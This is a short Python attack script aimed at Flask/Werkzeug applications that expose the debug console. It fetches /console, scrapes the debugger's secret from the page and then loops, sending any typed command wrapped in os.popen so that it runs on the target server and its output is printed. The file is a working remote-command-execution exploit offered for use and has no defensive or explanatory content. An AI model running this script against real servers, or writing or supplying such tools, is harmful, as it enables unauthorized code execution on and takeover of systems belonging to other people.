#!/usr/bin/env python
#this script allow manage WerkZeug Debug console
import requests
import sys
import re

url = sys.argv[1]
if len(sys.argv) != 2:
    print("USAGE: python3 %s <website> " % (sys.argv[0]))
    sys.exit(-1)

response = requests.get('%sconsole' % url)
print(response)
if "Werkzeug powered traceback interpreter" not in response.text:
    print ("[-] Debug is not enabled")
    sys.exit(-1)

#find secret in open source
secret = re.findall("[0-9a-zA-Z]{20}",response.text)
if len(secret) != 1:
    print ("[-] Couldn't get the SECRET")
    sys.exit(-1)
else:
    secret = secret[0]
    print("[+] SECRET is: "+str(secret))

while True: 
    command = input("cmd>")
    if command=='exit' or command=='quit':
        sys.exit(-1)
    cmd = "__import__('os').popen(\'%s\').read();" % command
    print ("[+] Script will try executing %s on command %s" % (url, command))
    response = requests.get(url + "console?__debugger__=yes&cmd=%s&frm=0&s=%s" % (cmd,secret))
    response = re.search(">'.*'<", str(response.text)).group(0)
    line = response.split("\\n")[:-1]
    for i in line:
        print(i)
